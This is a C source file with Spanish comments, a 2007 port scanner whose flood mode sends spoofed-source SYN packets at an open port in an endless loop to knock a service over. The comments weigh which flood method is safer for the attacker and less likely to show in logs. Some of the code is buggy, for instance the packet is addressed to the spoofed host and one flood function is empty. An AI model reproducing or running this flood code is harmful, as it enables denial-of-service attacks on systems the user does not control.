
/* 
 * Una implementacion de un portscanner by jors (aka qat),
 * copyright © 2007.
 *
 */

//-------------------------- INCLUDES -------------------------------
#include <stdio.h>
#include <stdlib.h>         // atoi, por ejemplo
#include <string.h>         // memset
#include <sys/socket.h>     // Includes para sockets y demás
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <unistd.h>
#include <resolv.h>
#include <errno.h>          // Para poder consultar errno
#include <netdb.h>
#include <signal.h>
#include <sys/wait.h>       // Para waitpid()
//#include <dirent.h>         // Para scandir()
#include <pthread.h>        // Para los hilos

//--------------------------- CONSTANTES ----------------------------
#define DEBUG 0

//--------------------------- ESTRUCTURAS ---------------------------

// Estructura del nodo Puerto
struct Puerto
{
   int num;
   struct Puerto *pSig;
};

struct pseudo_header 
{ 
   /* For computing TCP checksum, see TCP/IP Illustrated p. 145 */
   unsigned long s_addr;
   unsigned long d_addr;
   char zer0;
   unsigned char protocol;
   unsigned short length;
};

//------------------------ VARIABLES GLOBALES------------------------
int g = 250000; // Default time gap: 0.25secs.
int f = 0; // Default flood mode: False.
int f_mode = 5; // Default flood level.
int low_p = 0, high_p = 1024; // Default port values.
struct Puerto *pNodoPrimero=NULL, *pNodoUltimo=NULL;
struct sockaddr_in servidor;
int sd, i;

//--------------------------- FUNCIONES -----------------------------

/* FUNCION CONNECTION_FLOOD  - Mas eficiente con SO's modernos, 
 * pero menos segura para el atacante porque muy probablemente
 * aparecera en los logs de la aplicacion que escuche en cada
 * puerto de los escaneados. */
void connection_flood()
{
}

/* FUNCION IN_CKSUM - Tomada de nmap */
unsigned short in_cksum(unsigned short *addr,int len)
{
   register int sum = 0;
	u_short answer = 0;
	register u_short *w = addr;
	register int nleft = len;
	/*
	 * Our algorithm is simple, using a 32 bit accumulator (sum), we add
	 * sequential 16 bit words to it, and at the end, fold back all the
	 * carry bits from the top 16 bits into the lower 16 bits.
	 *
	 */
    while(nleft > 1){
       sum += *w++;
	    nleft -= 2;
    }

    /* mop up an odd byte, if necessary */
    if(nleft == 1){
       *(u_char *)(&answer) = *(u_char *)w ;
	    sum += answer;
	 }

	 /* add back carry outs from top 16 bits to low 16 bits */
	 sum = (sum >> 16) + (sum & 0xffff);     /* add hi 16 to low 16 */
	 sum += (sum >> 16);                     /* add carry */
	 answer = ~sum;                          /* truncate to 16 bits */
	 return(answer);
}

/* FUNCION SYN_FLOOD - Menos eficiente con SO's modernos, pero mas
 * segura para el atacante. No llega a establecer una conexion (solo
 * da el 1er paso del 3-way-handshake) y pasa mas desapercibido, pero
 * no para los IDS. */
void syn_flood()
{
   int i = 0, port_num, encontrado = 0;
	struct Puerto *pNodoAuxiliar;
   
   while(encontrado==0)
   {
	   printf("Nº de puerto a floodear: ");
	   scanf("%d", &port_num);

      // Comprobacion de que el puerto a floodear sea uno de los abiertos
      pNodoAuxiliar = pNodoPrimero;
      while(pNodoAuxiliar != NULL)
      {
	      if(pNodoAuxiliar->num == port_num)
		   {
		      encontrado = 1;
		      break;
		   }
		   else
		      pNodoAuxiliar = pNodoAuxiliar->pSig;
      }

	   if(!encontrado)
	      printf("Debe introducir uno de los puertos abiertos!\n");
	}

    /* Tamaño del paquete TCP */
   unsigned int buffer_size = sizeof(struct iphdr)+sizeof(struct tcphdr);

	/* Buffer de tamaño suficiente para un paquete TCP */
   unsigned char buffer[buffer_size];
   memset(buffer,0,buffer_size);

   /* Cabeceras IP y TCP */
   struct iphdr *ip = (struct iphdr *)buffer;
   struct tcphdr *tcp = (struct tcphdr *)(buffer+sizeof(struct iphdr));
	struct pseudo_header *pseudo = (struct pseudo_header *) (buffer + sizeof(struct iphdr) - sizeof(struct pseudo_header));

	/* Crea el socket */
   if((sd=socket(AF_INET,SOCK_RAW,IPPROTO_TCP))==-1)
   {
      perror("socket(): Maybe you should have root privs?");
	   exit(1);
	}

	/* Establece las opciones del socket */
   int o = 1;
   if(setsockopt(sd,IPPROTO_IP,IP_HDRINCL,&o,sizeof(o))==-1)
   {
      perror("setsockopt()");
	   exit(1);
   }

   /* Rellena informacion del pseudoprotocol */
	pseudo->protocol = IPPROTO_TCP;
   pseudo->length = htons(sizeof(struct tcphdr));
	pseudo->s_addr = inet_addr("1.2.3.4");
   pseudo->d_addr = servidor.sin_addr.s_addr; // test

   /* Rellena la cabecera IP (http://www.faqs.org/rfcs/rfc791.html) */
   ip->version = 4;
   ip->ihl = 5;
   ip->tos = 1;// test
   ip->id = htonl(random());
   ip->saddr = inet_addr("1.2.3.4");
   //ip->daddr = inet_addr("1.2.3.4");
	ip->daddr = servidor.sin_addr.s_addr; // test
   ip->ttl = 255;
   ip->protocol = IPPROTO_TCP;
   ip->tot_len = buffer_size;
   ip->check = (unsigned short)in_cksum((unsigned short *)ip,sizeof(struct iphdr));

	/* Rellena la cabecera TCP */
   tcp->source = htons(1234);
   //tcp->dest = htons(1234);
	tcp->dest = htons(port_num); // test
   tcp->seq = htonl(999999999);
   tcp->ack_seq = htonl(999999999);
   tcp->ack = 1;
   tcp->syn = 1;
   tcp->window = htons(2048);
   tcp->check = in_cksum((unsigned short *)pseudo, sizeof(struct tcphdr) + sizeof(struct pseudo_header));

	servidor.sin_family = AF_INET;
	servidor.sin_port = tcp->source;
	servidor.sin_addr.s_addr = ip->saddr;

	while(1)
   {
  	   if((sendto(sd,buffer,buffer_size,0,(struct sockaddr*)&servidor,sizeof(struct sockaddr_in))) == -1)
      {
	      perror("sendto()");
		   exit(1);
      }

	   if(i%500 == 0)
	   {
		   printf("Floodeando el puerto %d (Ctrl+C para parar)... %d\r", port_num, i);
			fflush(stdout);
		   sleep(f_mode);
	   }

	  i++;
	}
}

/* FUNCION CONNECTION */
void connection()
{
   struct servent *port_info;
	struct Puerto *pNuevoNodo;

   // Intento de conexion al host
   if(connect(sd,&servidor,sizeof(servidor))==0)
   {
      // Esto viola el segmento, lastima! Deshabilitado
		// port_info = getservbyport(htons(i), "tcp");
      //printf("%d (%s) abierto.\n", i, port_info->s_name);
      printf("Puerto %i abierto.\n", i);

		// ... LISTA ENLAZADA ...
		pNuevoNodo = (struct Puerto *) malloc(sizeof(struct Puerto));
		if(pNuevoNodo == NULL)
		{
		   printf("Sin memoria!\n");
			exit(1);
		}
		pNuevoNodo->num = i;
		pNuevoNodo->pSig = NULL;

		if(pNodoPrimero==NULL) // A. Primer nodo de la lista?
		{
		   pNodoPrimero = pNuevoNodo;
			pNodoUltimo = pNuevoNodo;
		}
		else // B. Segundo o cualquier otro?
		{
			pNodoUltimo->pSig = pNuevoNodo;
		   pNodoUltimo = pNuevoNodo;
		}
		// ...

      close(sd);
   }
   else
   {
      if(DEBUG)
	   {
	      switch(errno)
	      {
	         case(EBADF): { printf("EBADF\n"); } break;
	         case(EFAULT): { printf("EFAULT\n"); } break;
	         case(ENOTSOCK): { printf("ENOTSOCK\n"); } break;
	         case(EISCONN): { printf("EISCONN\n"); } break;
	         case(ECONNREFUSED): { printf("ECONNREFUSED\n"); } break;
	         case(ETIMEDOUT): { printf("ETIMEDOUT\n"); } break;
	         case(ENETUNREACH): { printf("ENETUNREACH\n"); } break;
	         case(EADDRINUSE): { printf("EADDRINUSE\n"); } break;
	         case(EINPROGRESS): { printf("EINPROGRESS\n"); } break;
	         case(EALREADY): { printf("EALREADY\n"); } break;
	         case(EAGAIN): { printf("EAGAIN\n"); } break;
	         case(EAFNOSUPPORT): { printf("EAFNOSUPPORT\n"); } break;
	         case(EACCES): { printf("EACCES,\n"); } break;
	         case(EPERM): { printf("EPERM\n"); } break;
	         default: { printf("No signal!\n"); }
	      }
      }  
	   close(sd);
   }
}

/* FUNCION PARAMS */
void params(int argc, char* argv[])
{
   int i,j;

   if(argc<2)
   {
      printf("\nUso: %s hostname|ip [PARAMS]\n\n", argv[0]);
		printf("P.ej. para obtener ayuda:\n");
		printf("   %s hostname|ip -h\n\n", argv[0]);
      exit(0);
   }

   for(i=2; i<argc; i++)
   {
	   //printf("argv[%d]:%s\n", i, argv[i]);
		if(strncmp(argv[i],"-p", sizeof(char)*2)==0){

		   int bar_found = 0, a=0, b=0;
		   char low_p_string[6], high_p_string[6];

			for(j=2;j<strlen(argv[i]);j++)
			{
            if(argv[i][j]==':'){
				   bar_found = 1;
					continue;
				}

			   if(!bar_found){
				   low_p_string[a] = argv[i][j];
					a++;
				}
				else{
				   high_p_string[b] = argv[i][j];
					b++;
				}
			}
			low_p_string[a+1] = '\0';
			high_p_string[b+1] = '\0';

			low_p = atoi(low_p_string);
			high_p = atoi(high_p_string);
			
      }
      else if(strncmp(argv[i],"-g", sizeof(char)*2)==0){
         g = atoi(&argv[i][2]); // gap in microseconds
		}
      //else if(strcmp(argv[i], "-f")==0)
      //   f = 1;
		else if(strncmp(argv[i],"-f", sizeof(char)*2)==0){
		   f = 1;
		   f_mode = atoi(&argv[i][2]); // flood mode (from 0 to 9)
			if(f_mode == 0) f_mode = 9;
			else if(f_mode == 1) f_mode = 8;
			else if(f_mode == 2) f_mode = 7;
			else if(f_mode == 3) f_mode = 6;
			else if(f_mode == 4) f_mode = 5;
			else if(f_mode == 5) f_mode = 4;
			else if(f_mode == 6) f_mode = 3;
			else if(f_mode == 7) f_mode = 2;
			else if(f_mode == 8) f_mode = 1;
			else if(f_mode == 9) f_mode = 0;
		}
      else if(strcmp(argv[i], "-h")==0)
      {
         printf("\nUso: %s hostname|ip [PARAMS]\n", argv[0]);
         printf("\nPARAMS:\n\n");
			printf("-pN:M Establece el rango de puertos entre el cual hacer la\n");
			printf("      busqueda. Donde N es el primero y M el ultimo, siempre en\n");
			printf("      orden ascendente. Incluso un solo puerto debe especificarse\n");
			printf("      como un rango.\n");
         printf("-fN   Modo (syn)flood activado. Cuando acabe de hacer un scan\n");
			printf("      de puertos, permite hacer syn flood a uno de los abiertos,\n");
			printf("      caso de haber alguno. N indica el nivel de severidad del\n");
			printf("      flood, que puede ir de 0 a 9.\n");
         printf("-gN   Establece el intervalo de tiempo entre puertos. El\n");
			printf("      establecido por defecto (250000) esta recomendado\n");
			printf("      para hosts en Internet, mientras que para redes locales\n");
			printf("      puede usarse uno menor (p.ej. 100000). Dependiendo de los\n");
			printf("      tiempo de respuesta, establecer intervalos bajos puede dar\n");
			printf("      falsos positivos.\n");
         printf("-h    Muestra esta breve ayuda.\n\n");
         exit(0);
      }
      else
      { 
         printf("\nUso: %s hostname|ip [PARAMS]\n\n", argv[0]);
         exit(0);
      }
   }
}

/* MAIN */
int main(int argc, char* argv[])
{
    int valid, ret;
    struct sockaddr_in servidor_copia; // copia de servidor
    struct hostent *servidor_nombre;
	 struct Puerto *pNodo, *pNodoAuxiliar;
	 pthread_t thrd1, thrd2;

    // Analizamos los parametros
    params(argc, argv);

    system("clear");
    printf("Ejecutando scan de puertos en [%s]... \n\n", argv[1]);

    // Componemos la 1ª parte de la direccion del host
    memset(&servidor_copia,0,sizeof(servidor_copia));
    valid = inet_aton(argv[1],&servidor_copia.sin_addr);
    if(!valid)
    {
       // Obtenemos la IP si nos pasaron un nombre de host
       if((servidor_nombre=gethostbyname(argv[1])) == NULL)
       {
          perror("gethostbyname()");
          exit(1);
       }
       else
         servidor_copia.sin_addr = *((struct in_addr *)servidor_nombre->h_addr);
    }

    for(i=low_p; i<=high_p; i++) //65535
    {
       printf("Escaneando... %d\r", i);
		 fflush(stdout);
       // Creamos el socket
       if((sd=socket(PF_INET,SOCK_STREAM,0))==-1)
       {
          perror("socket()");
          exit(1);
       }
	 
       // Componemos la 2ª parte de la direccion del host
       memset(&servidor,0,sizeof(servidor));
       servidor.sin_family=AF_INET;
       servidor.sin_port=htons(i);
       servidor.sin_addr = servidor_copia.sin_addr;

       // Thread creation/launch!
		 ret = pthread_create(&thrd1, NULL, (void *)connection, NULL);
	    if(ret){
          perror("pthread_create(): connection");
	       exit(1);
	    }
		 //pthread_join(thrd1, NULL);

	    usleep(g);
	    close(sd);
		 pthread_kill(thrd1, 0);
		 //...
    }
   
	 // Mostramos los puertos encontrados abiertos (si hay)
	 pNodoAuxiliar = pNodoPrimero;
	 if(pNodoAuxiliar != NULL)
	 {
	    printf("\nPuertos abiertos: ");
	    while(pNodoAuxiliar != NULL)
	    {
          printf("%d ", pNodoAuxiliar->num);
		    pNodoAuxiliar = pNodoAuxiliar->pSig;
	    }
	    printf("\n\n");
	}
	else
	   printf("Ningun puerto abierto!\n\n");

    // Modo flood
	 if((pNodoPrimero!=NULL) && (f))
	    syn_flood();
	 else if((pNodoPrimero==NULL) && (f))
	    printf("Ningun puerto a floodear; saliendo...\n");

    return 0;
}
